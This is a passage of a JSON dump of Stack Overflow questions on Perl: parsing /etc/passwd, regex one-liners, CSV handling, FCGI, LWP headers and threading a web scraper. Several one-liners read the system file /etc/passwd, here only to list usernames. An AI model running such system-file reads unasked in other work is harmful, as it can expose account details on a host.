1\n</code></pre>\n"},{"tags":["regex","perl","shell","awk"],"answer_count":4,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":147,"score":2,"question_id":12256304,"title":"Get username from passwd file using shell scripting","body":"<p>From <code>/etc/passwd</code>, I need just the \"user\" part.</p>\n\n<p>Example:</p>\n\n<pre><code>backup:x:34:34:backup:/var/backups:/bin/sh\n</code></pre>\n\n<p>has <code>backup</code> as the user.</p>\n\n<p>To extract the user part I am using this now:</p>\n\n<pre><code>perl -pe 's/^(.*?):.*/\\1/g' &lt; /etc/passwd\n</code></pre>\n\n<p>which is a few characters less than my old method:</p>\n\n<pre><code>while read line; do echo ${line%%:*}; done &lt; /etc/passwd\n</code></pre>\n\n<p>but it sounds like an overkill. It's a lot of text to write.</p>\n\n<p>A Google search gives me:</p>\n\n<pre><code>awk -F  ':' '{print $1}' &lt; /etc/passwd\n</code></pre>\n\n<p>which is equivalent, I suppose? Is it?</p>\n\n<pre><code>cmp &lt;(perl -pe 's/^(.*?):.*/\\1/g' &lt; /etc/passwd) &lt;(awk -F  ':' '{print $1}' &lt; /etc/passwd)\n</code></pre>\n\n<p>Is there a standard UNIX tool to do this or an easier method using perl? Or <code>cut</code>?</p>\n\n<p>I am a beginner.</p>\n\n<p>BTW, I tried my hand at Python as follows but I suck at it, there may be better ways to do this in Python <code>:(</code></p>\n\n<pre><code>python -c 'print \"\\n\".join([u[:u.find(\":\")] for u in open(\"/etc/passwd\")])'\n</code></pre>\n\n<p>EDIT: actually, maybe more like this for Python:</p>\n\n<pre><code>python -c 'print \"\\n\".join([u.split(\":\")[0] for u in open(\"/etc/passwd\")])'\n</code></pre>\n\n<p>Hmm... still very verbose.</p>\n"},{"tags":["perl","shell","unix","command-line"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":84,"score":3,"question_id":12352773,"title":"need perl one liner to get a specific content out of the line and possibly average it","body":"<p>I have a file which had many lines which containts \"x_y=XXXX\"  where XXXX can be a number from 0 to some N.</p>\n\n<p>Now,\na) I would like to get only the XXXX part of the line in every such line.\nb) I would like to get the average</p>\n\n<p>Possibly both of these in one liners.</p>\n\n<p>I am trying out sometihng like</p>\n\n<pre><code>cat filename.txt | grep x_y | (this need to be filled)\n</code></pre>\n\n<p>I am not sure what to file\nIn the past I have used commands like</p>\n\n<pre><code>perl -pi -e 's/x_y/m_n/g' \n</code></pre>\n\n<p>to replace all the instances of x_y.\nBut now, I would like to match for x_y=XXXX and get the XXXX out and then possibly average it out for the entire file.</p>\n\n<p>Any help on this will be greatly appreciated. I am fairly new to perl and regexes.</p>\n"},{"tags":["perl","email","pop"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":69,"score":1,"question_id":11844312,"title":"Mail::POP3Client Download Latest n-emails?","body":"<p>I'm using <a href=\"http://search.cpan.org/~sdowd/Mail-POP3Client-2.16/POP3Client.pm\" rel=\"nofollow\">Mail::POP3Client</a> for its simplicity and would like to pull the headers of the latest <code>n</code> messages (5 in my code). \nThis will be a webscript and on page load the latest 5 emails are downloaded and parsed (their subjects and senders) \nBut the way it is now I get some assortment of emails from July instead of my latest 5 (I have plenty of emails before July as well). Apparently <code>my $email_count = $pop-&gt;Count;</code> is just count and not an index-type value?</p>\n\n<pre><code>for (my $i = $email_count; $i &gt;= $email_count-5; $i--) {\n    foreach ($pop-&gt;Head($i)) {\n        if (/^(From):\\s+/i)    { $FROM = $_; }\n        if (/^(Subject):\\s+/i) { $SUBJECT = $_; }\n\n        if (/^(Date):\\s+/i) {\n            $TIME = $_;\n            $TIME =~ s/Date: (.*)/$1/;\n\n            my $tstamp = str2time($TIME);\n#           $TIME = $tstamp;\n            $TIME = scalar localtime($tstamp);\n\n            my @fromsubj;\n            $fromsubj[0] = $FROM;\n            $fromsubj[1] = $SUBJECT;\n            $subject{$TIME} = [@fromsubj];\n        }\n    }\n\n\n    print \"Index: $i \\n\";\n    }\nprint Dumper(%subject);\nprint \"\\n\";\nprint Dumper(%from);\n\nprint \"Mails $email_count to \".($email_count-5);\n</code></pre>\n\n<p>Output:</p>\n\n<pre><code>Index: 4030 \nIndex: 4029 \nIndex: 4028 \nIndex: 4027 \nIndex: 4026 \nIndex: 4025\n\n$VAR1 = 'Thu Jul 26 09:01:07 2012';\n$VAR2 = [\n          'From: Person one ',\n          'Subject: Fwd: test '\n        ];\n$VAR3 = 'Tue Jul 24 15:09:43 2012';\n$VAR4 = [\n          'From: person two ',\n          'Subject: subj '\n        ];\n(And so on)\n ....\nCount 4030 4020\n</code></pre>\n\n<p>How can I pull the latest emails only? Is this possible with POP/this module at all, if not what could I use instead?</p>\n"},{"tags":["perl","man","makemaker"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":12353534,"title":"Man pages with MakeMaker","body":"<p>I wrote some man pages which I'd like to install from a MakeMaker.</p>\n\n<p>I'd like to control where they're installed using environment variables like <code>INSTALLSITEMAN1DIR*</code> environment variables.</p>\n\n<p>Where in the source tree should I place the man files, or what do I need to do to Makefile.PL to tell it about them?</p>\n"},{"tags":["perl","networking"],"answer_count":10,"favorite_count":2,"up_vote_count":3,"down_vote_count":1,"view_count":7571,"score":2,"question_id":330458,"title":"How can I determine the local machine's IP addresses from Perl?","body":"<p>Is there a clean and OS independent way to determine the local machine's IP addresses from Perl?</p>\n\n<p>So far I have found the following solutions:</p>\n\n<ul>\n<li><p>parse the output of ifconfig and ipconfig (hard, different windows versions have different ipconfig outputs)</p></li>\n<li><p>establish a network connection to a well-known IP and examine the socket's local IP address (won't work if I can't establish a connection and will determine only one IP address)</p></li>\n</ul>\n\n<p>Any better suggestion?</p>\n"},{"tags":["java","python","perl","node.js","x10"],"answer_count":0,"favorite_count":1,"up_vote_count":1,"down_vote_count":1,"view_count":84,"score":0,"question_id":12323205,"title":"Programming to read wireless X10 devices","body":"<p>Does anyone have experience receiving signals from X10 motion detectors into a computer program?</p>\n\n<p>If I understand correctly, X10 is an open industry standard, so I would like to pursue that instead of just investing in a particular brand. This way I can switch brands of transceivers and detectors and still get the job done.</p>\n\n<p>I am only mildly interested in controlling lights, etc. What I am trying to do is detect motion using an X10 motion sensor.</p>\n\n<p>I want to know if there is an example program, that works in action, and I want to know if all X10 wireless devices are the same. I am hesitant to just buy a transceiver and attach it, and in the end only find out that I can't program with it. I am trying to detect motion, and I want to know if anyone has done it before, so I know if it can be done, and what puzzle pieces worked for said person.</p>\n"},{"tags":["perl","bash","unix","sed","awk"],"answer_count":2,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":95,"score":2,"question_id":6027939,"title":"list the files with minimum sequence","body":"<p>I have some files in a directory as below (not necessarily sorted):</p>\n\n<pre><code>A_10\nA_20\nA_30\nB_10\nB_30\nC_10\nC_20\nD_20\nD_30\nE_10\nE_20\nE_30\n</code></pre>\n\n<p><code>10</code>, <code>20</code> and <code>30</code> are the sequence numbers of <code>A,B,C,D,E</code> respectively.</p>\n\n<p>I want to select only those files with minimum sequence of all <code>A,B,C,D,E</code>\nthe output should be :</p>\n\n<pre><code>A_10\nB_10\nC_10\nD_20\nE_10\n</code></pre>\n\n<p>could anybody help me?</p>\n"},{"tags":["python","regex","perl"],"answer_count":4,"favorite_count":3,"up_vote_count":12,"down_vote_count":0,"view_count":2868,"score":12,"question_id":288968,"title":"Can I use named groups in a Perl regex to get the results in a hash?","body":"<p>Is it possible to perform a named-group match in Perl's regex syntax as with Python's? I always bind the <code>$n</code> values to proper names after matching, so I'd find it more convenient to do it in the regex itself if it's possible.</p>\n\n<p>Python does it like so:</p>\n\n<pre><code>&gt;&gt;&gt; import re\n&gt;&gt;&gt; regex = re.compile(r'(?P&lt;count&gt;\\d+)')\n&gt;&gt;&gt; match = regex.match('42')\n&gt;&gt;&gt; print match.groupdict()\n{'count': '42'}\n</code></pre>\n\n<p>I know the <code>?P</code> indicates that it's a Python-specific regex feature, but I'm hoping it's in Perl in a different way or was added later on. Is there any way to get a result hash in a similar manner in Perl?</p>\n"},{"tags":["php","perl","serialization","data-dumper"],"answer_count":6,"favorite_count":0,"up_vote_count":7,"down_vote_count":0,"view_count":163,"score":7,"question_id":12352695,"title":"How to deserialize Perl Data::Dumper output in PHP","body":"<p>I have a result of export variable in Perl like this string:</p>\n\n<pre><code>$VAR1 = {\n    'guard' =&gt; undef,\n    'work_hand' =&gt; undef,\n    'images' =&gt; \n        {'1' =&gt; \n            {\n            'mini_height' =&gt; 150,\n            'width' =&gt; 150,\n            'extension' =&gt; 'jpg',\n            'filename' =&gt; 'object_1.1330907414.96873.jpg',\n            'mini_width' =&gt; 150,\n            'class' =&gt; 'Ontico::Image',\n            'height' =&gt; 150,\n            'mini_filename' =&gt; 'object_1.1330907414.96873.mini.jpg',\n            'size' =&gt; 26053,\n            'symname' =&gt; 'big_logo'\n            },\n        '2' =&gt; \n            {\n            'width' =&gt; 48,\n            'extension' =&gt; 'jpg',\n            'alt' =&gt; 'ÐÐ°Ð½Ð¸ÑÐ»Ðµ ÐÐ°Ð»Ð»Ð¾Ð¿Ð¿Ð°',\n            'height' =&gt; 48,\n            'mini_filename' =&gt; 'object_91.1235312905.mini.jpg',\n            'size' =&gt; 12809,\n            'symname' =&gt; 'logo',\n            'mini_height' =&gt; 150,\n            'filename' =&gt; 'object_91.1235312905.jpg',\n            'mini_width' =&gt; 150,\n            'class' =&gt; 'Ontico::Image'\n            }\n        },\n        'show_league_banner' =&gt; 0,\n        'back_hand' =&gt; undef,\n        'weight_category' =&gt; undef,\n        'stick_position' =&gt; undef\n    };\n</code></pre>\n\n<p>How can I deserialize this data in PHP?</p>\n\n<p><strong>P.S. I already have data in this format in DB, I cannot change it to json or another.</strong></p>\n"},{"tags":["regex","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":70,"score":1,"question_id":12353233,"title":"Perl: Multiple lookbehind regex in a single regex expression","body":"<p>I am new to perl and regular expressions so was working on <code>lookbehind</code> expression using the below code:</p>\n\n<pre><code>my $string = \"My hello 12 world 13\";\n\nsay \"$1 $2\" if ($string =~ m!(?&lt;=hello\\s)(\\d+)\\s(?&lt;=world\\s)(\\d+)!);\n</code></pre>\n\n<p>Now when I try to run the above code it prints nothing but if I remove one of the lookbehind expr. it works fine.</p>\n\n<p>So, is it not possible to have more than one lookbehind in a single regex and if yes than what is the workaround.</p>\n"},{"tags":["perl","hash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12311620,"title":"How to use a hash value defined in my program in a another perl one-liner program?","body":"<p>I am using Perl on Windows with Eclipse IDE.\nWhat I have already done is, that I have parsed a text file and extracted the contents I need, into a <code>%hash</code>.\nAnd finally, my <code>%hash \"Key\"</code> contains function names and <code>%hash \"Value\"</code> contains the corresponding function definition.</p>\n\n<p>Now, my query is, Can I used my<code>%hash \"Values\"</code> in a <code>PERL</code> one-liner(which I am running at the end of the same program) ?</p>\n\n<p>If Yes, then I have tried the following, and it doesn't seem to work:</p>\n\n<p><code>perl -pi.bak -e \"if(! /#/){s/ PERFORM ([\\\\w-]+)\\.?/qq(#  PERFORM \\$1\\n). \\$hash{\\$1}/ge}\" TestFinal.txt</code>;</p>\n"},{"tags":["perl","buffering"],"answer_count":1,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":162,"score":4,"question_id":12351500,"title":"Perl, disable buffering input","body":"<p>There is a file:</p>\n\n<pre><code>:~$ cat fff\nqwerty\nasdf\nqwerty\nzxcvb\n</code></pre>\n\n<p>There is a script:</p>\n\n<pre><code>:~$ cat 1.pl\n#!/usr/bin/perl\nprint &lt;STDIN&gt;\n</code></pre>\n\n<p>The command works as expected:</p>\n\n<pre><code>:~$ cat fff | perl -e 'system(\"./1.pl\")'\nqwerty\nasdf\nqwerty\nzxcvb\n</code></pre>\n\n<p>But this command will not work as expected: the first &lt;STDIN&gt; reads all the data, not a single line. How to disable buffering for &lt;STDIN&gt;?</p>\n\n<pre><code>:~$ cat fff | perl -e '$_ = &lt;STDIN&gt;; system(\"./1.pl\")'\n:~$\n</code></pre>\n"},{"tags":["arrays","perl"],"answer_count":5,"favorite_count":0,"up_vote_count":5,"down_vote_count":0,"view_count":152,"score":5,"question_id":12347753,"title":"How to split this array in perl?","body":"<p>How to split the following array so that i can get lon and lat points only every time ? In perl Script  ?</p>\n\n<pre><code>[{\"lon\":77.594376,\"lat\":12.971606,\"bfg\":18000,\"xyz\":null,\"jky\":null},{\"lon\":77.604376,\"lat\":12.980606,\"bfg\":18000,\"xyz\":null,\"jky\":null},{\"lon\":77.674376,\"lat\":12.981606,\"bfg\":18000,\"xyz\":null,\"jky\":null},{\"lon\":77.684376,\"lat\":12.982606,\"bfg\":18000,\"xyz\":null,\"jky\":null},{\"lon\":77.744376,\"lat\":12.983606,\"bfg\":18000,\"xyz\":null,\"jky\":null},{\"lon\":77.784376,\"lat\":12.990606,\"bfg\":18000,\"xyz\":null,\"jky\":null},{\"lon\":77.804376,\"lat\":12.991606,\"bfg\":18000,\"xyz\":null,\"jky\":null},{\"lon\":77.824376,\"lat\":12.995606,\"bfg\":18000,\"xyz\":null,\"jky\":null},{\"lon\":77.874376,\"lat\":12.997606,\"bfg\":18000,\"xyz\":null,\"jky\":null},{\"lon\":77.894376,\"lat\":12.999606,\"bfg\":18000,\"xyz\":null,\"jky\":null}]\n</code></pre>\n\n<p>Any help ? </p>\n"},{"tags":["python","ruby","perl","bash","awk"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":99,"score":2,"question_id":12348761,"title":"Find files with wrong date given filename","body":"<p>I have a directory with files whose names are common with a suffix of increasing date.</p>\n\n<p>An example is: </p>\n\n<pre><code>REUTERS.FH_lbm_dump.20120905 \n</code></pre>\n\n<p>representing the 5th of September.</p>\n\n<p>These files are supposed to be created in the first few minutes of the next day, e.g. the above file should've been created at 00:01 on the 6th of September.</p>\n\n<p>However, due to some bug with how the filenames are generated, an application has been saving them incorrectly. So files created at 00:16 on the 5th of September have the suffix 20120905, i.e. the filename is 1 day too late.</p>\n\n<p>Output from <code>ls -h</code> showing the wrong naming:</p>\n\n<pre><code>2012-09-05 00:16 FH_lbm_dump.20120905\n</code></pre>\n\n<p>So logic to detect this would look at the file name, extract the date, and if its equal to the file timestamp it would be positive. </p>\n\n<p>How can we do this in Bash / Perl / Python? </p>\n"},{"tags":["xml","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":33,"score":0,"question_id":12350791,"title":"perl: xml to object and back exactly","body":"<p>Is there any XML to object converter that can convert back again, which ensures the files are exact duplicates? I can't see to find any on CPAN that ensure the files can go in and out exactally as they are made.</p>\n"},{"tags":["mysql","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":51,"score":0,"question_id":12348566,"title":"error during call perl script in mysql trigger","body":"<p>I want to write trigger that after insert call perl script like following code : </p>\n\n<p>create trigger example after insert on radacct </p>\n\n<p>for each row begin</p>\n\n<p>set @rs=sys_exec(CONCAT('/usr/bin/perl','/usr/bin/p2.pl'));</p>\n\n<p>end</p>\n\n<p>My trigger successful runs But my perl script does not run.And value of @rs is zero after insert.</p>\n\n<p>Please guide me </p>\n"},{"tags":["eclipse","perl","keyboard-shortcuts"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":699,"score":2,"question_id":3664859,"title":"Goto Function definition in Eclipse","body":"<p>If my cursor is in a function call in a perl file , is there any shortcut in eclipse that would take me to the definition of the function( in the same file) like <code>gd</code> in vim?</p>\n"},{"tags":["perl","apache","cgi","fastcgi","fcgi"],"answer_count":1,"favorite_count":0,"up_vote_count":10,"down_vote_count":0,"view_count":154,"score":10,"question_id":12348594,"title":"Why did Perl say() not append newline in FCGI mode?","body":"<p>I have a strange behaviour with Perl's say function in FCGI mode. Newlines won't be append. Why does this happen?</p>\n\n<p>Sample code:</p>\n\n<pre><code>#!/usr/bin/perl -wT\nuse strict;\nuse warnings;\nuse utf8;\nuse feature qw( say );\nuse FCGI ();\nuse CGI qw( header );\nmy $cnt = 0;\nmy $req = FCGI::Request();\nwhile ( $req-&gt;Accept() &gt;= 0 ) {\n    $cnt++;\n    print header( -type =&gt; 'text/plain', -charset =&gt; 'utf-8' );\n    say \"Hello, world #$cnt\";\n    print \"\\n\";\n    print \"$$\\n\"\n    print 'Test 1234';\n}\n</code></pre>\n\n<p>Expected result (and actual result via console):</p>\n\n<pre><code>Content-Type: text/plain; charset=utf-8\n\nHello, world. #1\n\n6712\nTest 1234\n</code></pre>\n\n<p>Actual result via Apache/FCGI:</p>\n\n<pre><code>Content-Type: text/plain; charset=utf-8\n\nHello, world. #3\n6709\nTest 1234\n</code></pre>\n\n<p>Some software info...</p>\n\n<blockquote>\n  <p>Debian Wheezy x86_64\n  Apache/2.2.22-11\n  mod_fcgid/1:2.3.6-1.1\n  Perl/5.14.2-12\n  FCGI.pm/0.75-1+b1</p>\n</blockquote>\n"},{"tags":["regex","perl","find-occurances"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12347090,"title":"extract only the first occurrence of the strings","body":"<p>I searched a lot but I didnt find answers which would suit what I am looking for so I am posting this question.</p>\n\n<p>I want to extract the first occurance of 'par','comp' 'order' and 'nameprefix'. How to do this for the example input? Is there any perl oneliners to do it?</p>\n\n<pre><code>    wertydhhdbc-&gt;auCdl = '( nil\n    par    (xyz)\n    comp     asd1\n    order        (done)\n    namePrefix        \"X\"\n    par    (xyz)\n    comp     asd\n    order        (done)\n    namePrefix        \"R\"\n    namePrefix        \"X\"\n    par    (qwer)\n    comp     key\n    order        (done)\n    namePrefix        \"X\"\n    comp     key\n    order        (done )\n    par    (qwer)\n    order        (done)\n</code></pre>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":109,"score":2,"question_id":11045403,"title":"Unable to understand reason for Tie::File failure","body":"<p>I have the following code</p>\n\n<pre><code>#!/usr/bin/perl\nuse Tie::File;\n\ntie my @last_id, 'Tie::File', 'last_id.txt' or die \"Unable to open this file !$i\";\nprint @last_id[0];\n\nexit;\n</code></pre>\n\n<p>and a file named <code>last_id.txt</code> with something like this in it</p>\n\n<pre><code>1\n2\n3\n4\n5\n6\n</code></pre>\n\n<p>When I run the program nothing gets output. I tried <code>$last_id[0]</code> but still nothing. :/</p>\n\n<p>I have latest ActivePerl installed.</p>\n\n<p>EDIT:</p>\n\n<p>Now I get the <code>Unable to open this file</code> message, but the file exists in the same directory as the program source file.</p>\n"},{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12346419,"title":"Automatic syntax check for several search terms or keywords using Perl","body":"<p>I have a small task to do, I have a set of search terms that i will be using to search on a large database where if it find that search terms it will hit the document in the DB. However, before this happens i need to make sure the search terms are loaded with proper syntax. For example, i have search terms like this:</p>\n\n<pre><code>illegal*\nunauthoriz* OR (without w/2 authori*)\nspecial w/3 (fee* OR pay*)\nkickback* OR (kick w/3 back*))\noff  w/3 book*\n</code></pre>\n\n<p>Now if you notice above, in the 4th line i have extra bracket and in the 5th line there is extra space. So this will not import as there are errors. </p>\n\n<p>So now the question is, is it possible for me to check these errors before i import using perl script if yes could you please help me on this</p>\n"}]}
{"total":22324,"page":20,"pagesize":100,"questions":[{"tags":["perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12345775,"title":"Perl parsing the csv file","body":"<p>I am just trying to read .csv file first time.I have gone through the below link : </p>\n\n<p><a href=\"http://search.cpan.org/~hmbrand/Text-CSV_XS-0.91/CSV_XS.pm#Reading_a_CSV_file_line_by_line\" rel=\"nofollow\">http://search.cpan.org/~hmbrand/Text-CSV_XS-0.91/CSV_XS.pm#Reading_a_CSV_file_line_by_line</a>:</p>\n\n<p>I have few doubt, well if you want, u can tell me this are silly question but i don't know, why i am not able to figure it out that how exactly perl is reading csv file :(</p>\n\n<p>So, my doubt is: </p>\n\n<p><strong>First Question</strong> </p>\n\n<p>What is the difference between reading the csv file line by line and parsing the file.</p>\n\n<p>I have simple program where i am reading  the csv file line by line. \nBelow is my program: </p>\n\n<pre><code>#!/usr/bin/perl -w\nuse strict;\nuse Text::CSV;\nuse Data::Dumper;\n\nmy $csv=Text::CSV-&gt;new( );\nmy $my_file=\"test.csv\";\nopen(my $fl,\"&lt;\",$my_file) or die\"can not open the file $!\";\n#print \"$ref_list\\n\";\n\nwhile(my $ref_list=$csv-&gt;getline($fl))\n{\n\nprint \"$ref_list-&gt;[0]\\n\";\n} \n</code></pre>\n\n<p>Below is the data in csv file  : </p>\n\n<pre><code>\"Emp_id\",\"Emp_name\",\"Location\",\"Company\"\n102713,\"raj\",\"Banglore\",\"abc\"\n403891,\"Rakesh\",\"Pune\",\"Infy\"\n530201,\"Kiran\",\"Hyd\",\"TCS\"\n503110,\"raj\",\"Noida\",\"HCL\"\n</code></pre>\n\n<p><strong>Second Question:</strong></p>\n\n<p>If I want to get  specific Emp_id along with Location then how can i proceed. </p>\n\n<p><strong>Third Question :</strong></p>\n\n<p>If I want only 102713 ,530201,503110 Emp record i.e name,location,compnay name then what should i do ? </p>\n\n<p>Thanks</p>\n"},{"tags":["perl","dancer"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":132,"score":0,"question_id":12344220,"title":"simple form validation in dancer/perl","body":"<p>I am trying to do a simple form validation  in perl dancer  but I was wondering what would be the best way to validate simple parameters (e.g. field cannot be empty, validity of the email, minimum length of a field) in dancer/perl without any extra plugin or CPAN module</p>\n\n<p>here is the code so far </p>\n\n<pre><code>post '/register' =&gt; sub {\n\nmy $db = connect_db();\nmy $sql = 'insert into users (username, email, password, motivation) values (?, ?, ? ,?)';\nmy $sth = $db-&gt;prepare($sql) or die $db-&gt;errstr;\n$sth-&gt;execute(params-&gt;{'username'}, params-&gt;{'email'},params-&gt;{'password'}, params-&gt;{'motivation'}) or die $sth-&gt;errstr;\n\nset_flash('Hey you signed up !');\nredirect '/thanks';\n};\n</code></pre>\n\n<p>I did google it and I found several ways to do validation using CPAN modules like Form::Foo but how do it without that ?</p>\n"},{"tags":["perl","datetime","time-series"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":121,"score":2,"question_id":12334859,"title":"Storing time series data, without a database","body":"<p>I would like to store time series data, such as CPU usage over 6 Months (Will poll the CPU usage every 2 minutes, so later I can get several resolutions, such as - 1 Week, 1 Month, or even higher resolutions, 5 Minutes,etc).</p>\n\n<p>I'm using Perl, and I dont want to use RRDtool or relational database, I was thinking of implementing my own using some sort of a circular buffer (ring buffer) with the following properties:</p>\n\n<ol>\n<li>6 Months = 186 Days = 4,464 Hours = 267,840 Minutes.</li>\n<li>Dividing it into 2 minutes sections: 267,840 / 2 = 133,920.</li>\n<li>133,920 is the ring-buffer size.</li>\n<li>Each element in the ring-buffer will be a hashref with the key as the epoch (converted easily into date time using <code>localtime</code>) and the value is the CPU usage for that given time.</li>\n<li>I will serialize this ring-buffer (using <code>Storable</code> I guess)</li>\n</ol>\n\n<p>Any other suggestions?\nThanks,</p>\n"},{"tags":["multithreading","perl"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":113,"score":3,"question_id":12342458,"title":"Multithreading in Perl","body":"<p>Please help me to make my script multithreaded. I have read the documentation for the <a href=\"https://metacpan.org/module/threads%3a%3ashared\" rel=\"nofollow\"><code>threads::shared</code></a> module but it didn't help to understand how to do it</p>\n\n<pre><code>    use threads;\nuse threads::shared;\nuse LWP::UserAgent;\nuse HTTP::Cookies;\n\nmy $NUM_WORKERS = 2;\n\nsub worker {\n   my ($i) = @_;\n   my ($web, $ck) = browser();\n    ($username, $password) = split ':', $acc;\n    my $url = 'http://www.site.ru/?tkn'. int(rand(10000));\n    my $response = $web-&gt;post($url, Content =&gt;\n                    [//////]);\n    while(1)\n    {\n        my $url = 'http://www.site.ru/dk?st.page='.$i.'&amp;st.name=%D0%B0';\n        my $response  = $web-&gt;get($url);\n        @list = ($response-&gt;content =~ /card_wrp\"&gt;&lt;div class=\"photoWrapper\"&gt;&lt;div&gt;&lt;a href=\"\\/(.*?)\\?/g);\n        @popl = ($response-&gt;content =~/&lt;\\/div&gt;&lt;div class=\"info\"&gt;(.*?)&lt;\\/div&gt;/g);\n\n        for ($j = 0; $j &lt;= scalar @list - 1; $j++)\n        {\n            $popl[$j] =~ s/&amp;nbsp;//g;\n            open F, \"&gt;&gt;gr.txt\";\n            print F $list[$j].':'.$popl[$j]. \"\\n\";\n            close F;\n        }\n        print \"[+] Page $i \\n\";\n\n    }\n}\n\nmy $i :shared = 1;\nmy $last = 79265;\nmy @workers;\nfor (1..$NUM_WORKERS) {\n   push @workers, async {\n      while (1) {\n         my $i;\n         {\n            lock $I;\n            return if $i == $last;\n            $i = ++$I;\n         }\n         worker($i);\n      }\n   };\n}\n\n$_-&gt;join() for @workers;\nsub browser \n{\n my $web = new LWP::UserAgent;\n my $ck = new HTTP::Cookies;\n    $web-&gt;cookie_jar($ck);\n    $web-&gt;agent('Opera/9.80 (Windows 7; U; en) Presto/2.9.168 Version/11.50');\n    $web-&gt;requests_redirectable(0); \n\n    $web-&gt;timeout(5);\n return $web, $ck;\n}\nsub loadf {\n    open (F, \"&lt;\".$_[0]) or erroropen($_[0]); \n    chomp(my @data = &lt;F&gt;);\n    close F;\n    return @data;\n}\n</code></pre>\n\n<p>I can't understand what variable I need to share. Thanks a lot to all members who will help me</p>\n"},{"tags":["perl","http-headers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":66,"score":0,"question_id":12343144,"title":"How to access HTTP headers from a given url?","body":"<p>I am looking for a way to get <code>http headers</code> from a given url. I tried the below code but it is not working:</p>\n\n<pre><code>#!/usr/bin/perl\n\n#use warnings;\n#use strict;\nuse LWP::UserAgent;\n\nmy $ua  = LWP::UserAgent-&gt;new;\nmy $res = $ua-&gt;get(\"http://cpan.org\");\nprint $res-&gt;header('Content-Length');\n</code></pre>\n\n<p>The above code prints nothing. So, where am I going wrong here or is there any better way to access headers.</p>\n"},{"tags":["perl","module"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":84,"score":0,"question_id":12335431,"title":"Perl validate module before use","body":"<p>I am using Module::Pluggable to load modules from a given directory:</p>\n\n<pre><code>for my $module ( plugins() ) {\n\n    eval \"use $module\";\n    if ($@) {\n\n        my $error = (split(/\\n/, $@))[0];\n        push @rplugin_errors, $error;\n        print STDOUT \"Failed to load $module: $error\\n\";\n    } else {\n\n        print STDOUT \"Loaded: $module\\n\";\n        my $mod = $module-&gt;new();\n        my $module_name = $mod-&gt;{name};\n        $classes{$module_name} = $mod;\n    }\n}\n</code></pre>\n\n<p>This function can be called via a reload method elsewhere. But if a one of the modules I am trying to \"use\" throws an errors it's not loaded and the script is somewhat crippled. </p>\n\n<p>I'd like to validate each module in plugins() before executing use. So Ideally I could do something like:</p>\n\n<pre><code>$error = 0;\nfor my $module ( plugins() ) {\n\n    eval TEST $module;\n    if ($@) {\n\n        print STDERR \"$module failed. Will not continue\";\n        $error = 1;\n        last;\n    }\n}\n\nif ($error == 0) {\n\n    for my $module ( plugins() ) {\n\n        use $module;\n    }\n}\n</code></pre>\n"},{"tags":["perl"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":95,"score":1,"question_id":12291923,"title":"Creating a dynamic Perl function which uses a variable's value at time of function declaration","body":"<p>I'd like to create a dynamic function that uses (evaluates?) the value of a variable at the time the function is declared.</p>\n\n<p>The example below requires $var to exist as a global variable so it can be used when the function is invoked:</p>\n\n<pre><code>my $var = 'something';\n\nsomeFunction(sub { return $_[0] eq $var; });\n</code></pre>\n\n<p>but I'm guessing there is some way to create the dynamic function so it is declared like this:</p>\n\n<pre><code>someFunction(sub { return $_[0] eq 'something'; });\n</code></pre>\n\n<p>How can I do that!? :)</p>\n"},{"tags":["multithreading","perl"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":96,"score":0,"question_id":12168495,"title":"thread shared perl","body":"<p>i wrote a code and i need to make it multithreaded. Evething works, but every loop repeats 4 times:</p>\n\n<pre><code>use LWP::UserAgent;\nuse HTTP::Cookies;\nuse threads;\nuse threads::shared;\n\n$| = 1;\n\n$threads = 4;\nmy @groups :shared = loadf('groups.txt');\n\nmy @thread_list = ();\n$thread_list[$_] = threads-&gt;create(\\&amp;thread) for 0 .. $threads - 1;\n$_-&gt;join for @thread_list;\nthread();\n\nsub thread\n{\n    my $url = 'http://www.site.ru/';\n    my $response = $web-&gt;post($url, Content =&gt;\n                    ['st.redirect' =&gt; ''\n                    ]);\n    foreach $i (@groups)\n    {\n\n        my $response  = $web-&gt;get($i);\n        if(!($response-&gt;header('Location')))\n        {\n            ---------;\n        }\n        else\n        {\n            ----------;\n        }\n\n    }\n\n}\n\nsub loadf {\n    open (F, \"&lt;\".$_[0]) or erroropen($_[0]); \n    chomp(my @data = &lt;F&gt;);\n    close F;\n    return @data;\n}\n</code></pre>\n\n<p>groups.txt :</p>\n\n<pre><code>http://www.odnoklassniki.ru/group/47357692739634\nhttp://www.odnoklassniki.ru/group/56099517562922\n</code></pre>\n\n<p>I understand that i need to use threads::shared; but i can't undestand how to use it. </p>\n\n<hr>\n\n<p>Your post does not have much context to explain the code sections; please explain your scenario more 